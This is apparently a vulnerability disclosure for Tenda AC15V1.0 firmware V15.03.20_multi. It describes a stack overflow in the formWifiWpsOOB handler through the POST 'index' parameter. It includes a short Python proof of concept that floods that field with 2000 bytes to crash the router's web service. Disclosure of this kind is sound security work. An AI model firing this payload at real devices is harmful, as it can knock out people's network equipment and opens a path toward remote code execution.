## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `formWifiWpsOOB` function. The `nptr` variable receives the `index` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `nptr` can trigger this security vulnerability.

![image-20240306172913194](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172913194.png)

![image-20240314180524501](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314180524501.png)

![image-20240306172902301](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172902301.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WifiWpsOOB"
payload = b"a"*2000

data = {"index": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314180538888](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314180538888.png)